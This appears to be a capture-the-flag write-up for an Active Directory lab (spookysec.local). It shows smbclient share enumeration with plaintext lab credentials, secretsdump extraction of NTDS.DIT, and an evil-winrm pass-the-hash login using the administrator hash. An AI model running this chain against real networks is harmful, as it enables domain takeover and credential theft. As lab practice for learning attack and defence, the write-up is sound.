## smbclient
From the [smbclient](#smbclient) manual, 
```
-L|--list

This option allows you to look at what services are available on a server. You use it as `smbclient -L host` and a list should appear. The _`-I`_ option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you are trying to reach a host on another network.
```

I run `smbclient -L 10.49.182.45 -U svc-admin --password=management2005` to list how many shares there are.
![](attachments/Pasted%20image%2020260224162730.png)

To access SMB, I use `smbclient -I 10.49.182.45 -U spookysec.local/svc-admin management2005`

According to [this](#Example) page, I can run the following

`smbclient \\\\10.49.182.45\\backup -U svc-admin`

The slashes are used to escape something with smb. Using too few will cause errors.

![](attachments/Pasted%20image%2020260224164009.png)

I use `get backup_credentials.txt` to download the file to my system.

Upon viewing the file, it seems to be encoded of some sort.

## Privilege Escalation
According to [SecretsDump](#SecretsDump)
```
python3 secretsdump.py test.local/john:password123@10.10.10.1
```

Referencing this, I run the following,
`secretsdump.py spookysec.local/backup:backup2517860@10.49.182.45

The method that allowed me to dump NTDS.DIT is DRSUAPI
![](attachments/Pasted%20image%2020260224165901.png)

I also got the administrator's hash `0e0363213e37b94221497260b0bcb4fc`

Now with the hash of the administrator, I can perform `pass the hash` attacks.

I use Evil-WinRM to gain access to the administrator account

`evil-winrm -H 0e0363213e37b94221497260b0bcb4fc -i 10.49.182.45 -u Administrator`
![](attachments/Pasted%20image%2020260224170514.png)

From here, I just `cd, ls, cat` to each Users desktop to get their respective flag.
